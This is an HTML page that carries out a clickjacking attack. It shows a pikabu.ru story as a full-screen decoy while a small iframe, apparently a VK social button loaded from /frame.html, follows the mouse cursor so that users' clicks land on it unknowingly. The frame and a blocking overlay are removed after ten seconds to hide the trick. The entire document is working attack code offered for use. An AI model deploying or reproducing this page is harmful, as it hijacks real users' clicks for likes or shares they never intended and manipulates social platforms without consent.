<html>
<head>
	<title></title>
  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
</head>
<body>
  <div id="vkframe" style="position:absolute;z-index:3;">
    <iframe src="/frame.html" style="height:36px; width:100px; overflow-y: hidden;"  scrolling="no" seamless></iframe>
  </div>
  <iframe seamless src="http://pikabu.ru/story/a_vyi_ispyityivali_stress_1018565" style="position:absolute; top:0px;width:100%;height:100%;" scrolling="no"></iframe>
  <div id="overlay" style="width:100%;height:100%;position:absolute;top:0px;left:0px;z-index:2;"></div>
  <script type="text/javascript">
    $(document).bind('mousemove', function(e){
      $('#vkframe').css({
         left:  e.pageX - 50,
         top:   e.pageY - 20
      });
    });
    setTimeout(function(){
      $("#vkframe").hide();
      $("#overlay").hide();
    }, 10000);
  </script>

</body>
